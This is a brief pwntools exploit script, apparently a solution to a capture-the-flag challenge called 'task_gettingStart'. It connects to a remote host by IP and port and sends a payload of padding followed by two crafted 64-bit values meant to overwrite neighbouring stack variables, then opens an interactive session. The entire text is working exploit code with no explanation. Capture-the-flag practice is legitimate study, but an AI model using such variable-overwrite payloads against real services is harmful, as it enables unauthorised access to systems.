from pwn import *

p=remote("49.4.78.170",30843)
#p=process("./task_gettingStart")
v8=0x7FFFFFFFFFFFFFFF
payload=p64(0)*3+p64(v8)+p64(0x3FB999999999999A)
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()
